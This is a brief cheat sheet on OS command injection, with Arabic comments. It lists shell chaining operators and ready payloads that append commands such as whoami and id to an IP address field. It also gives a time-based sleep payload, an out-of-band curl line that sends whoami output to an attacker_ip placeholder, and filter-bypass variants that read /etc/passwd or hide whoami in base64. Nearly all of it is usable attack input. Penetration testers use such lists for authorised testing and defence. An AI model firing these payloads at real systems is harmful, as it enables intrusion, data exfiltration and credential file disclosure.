# Command Injection

## Operators أساسية
```bash
;        # تنفيذ تسلسلي بغض النظر عن نجاح الأول
&&       # ينفذ لو الأول نجح
||       # ينفذ لو الأول فشل
|        # pipe الناتج
`cmd`    # command substitution
$(cmd)   # command substitution
```

## أمثلة اختبار
```text
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 `id`
```

## Blind command injection
```text
127.0.0.1; sleep 5          # time-based
127.0.0.1; curl http://<attacker_ip>/$(whoami)   # out-of-band
```

## Bypass فلترة مسافات/كلمات
```text
cat${IFS}/etc/passwd
w'h'o'am'i
$(echo d2hvYW1p | base64 -d)
```
